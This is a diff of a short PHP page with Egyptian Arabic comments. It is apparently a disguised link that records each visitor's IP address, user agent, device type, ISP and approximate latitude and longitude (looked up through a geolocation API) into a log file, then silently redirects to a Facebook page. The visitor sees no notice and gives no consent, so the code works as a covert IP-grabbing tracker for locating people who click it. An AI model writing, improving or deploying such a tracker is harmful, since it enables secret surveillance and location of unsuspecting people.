@@ -1,27 +1,50 @@
 <?php
 date_default_timezone_set("Africa/Cairo");
 
-// الحصول على IP الزائر
+// بيانات الزائر
 $ip = $_SERVER['REMOTE_ADDR'];
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 $time = date("Y-m-d H:i:s");
 
-// استخدام API لجلب الموقع الجغرافي
-$geoData = json_decode(file_get_contents("https://ipwho.is/$ip"), true);
+// API لجلب معلومات الموقع ونوع الجهاز
+$apiUrl = "https://ipapi.co/$ip/json/";
+$response = file_get_contents($apiUrl);
+$data = json_decode($response, true);
 
-$country = $geoData['country'] ?? 'Unknown';
-$city = $geoData['city'] ?? 'Unknown';
-$region = $geoData['region'] ?? 'Unknown';
+// بيانات الموقع الجغرافي
+$country = $data['country_name'] ?? 'Unknown';
+$region = $data['region'] ?? 'Unknown';
+$city = $data['city'] ?? 'Unknown';
+$latitude = $data['latitude'] ?? 'Unknown';
+$longitude = $data['longitude'] ?? 'Unknown';
+$org = $data['org'] ?? 'Unknown';
 
-// بناء السطر النهائي
-$log = "IP: $ip | Country: $country | City: $city | Region: $region | Device: $userAgent | Time: $time\n";
+// تحديد نوع الجهاز بشكل مبدأي
+$deviceType = 'Unknown';
+if (preg_match('/mobile/i', $userAgent)) {
+    $deviceType = 'Mobile';
+} elseif (preg_match('/tablet/i', $userAgent)) {
+    $deviceType = 'Tablet';
+} elseif (preg_match('/linux|windows|macintosh/i', $userAgent)) {
+    $deviceType = 'Desktop';
+}
 
-// حفظ في ملف logs.txt
+// سجل البيانات
+$log = "=============================\n";
+$log .= "IP: $ip\n";
+$log .= "Country: $country\n";
+$log .= "Region: $region\n";
+$log .= "City: $city\n";
+$log .= "Latitude: $latitude | Longitude: $longitude\n";
+$log .= "Organization: $org\n";
+$log .= "Device Type: $deviceType\n";
+$log .= "User Agent: $userAgent\n";
+$log .= "Time: $time\n";
+
+// حفظ في logs.txt
 file_put_contents("logs.txt", $log, FILE_APPEND);
 
-// إشعار فوري - هنضيفه بعد كده
-
-// تحويل للصفحة اللي بعدها
+// إعادة التوجيه لصفحتك
 header("Location: https://www.facebook.com/elmercato0");
 exit;
 ?>
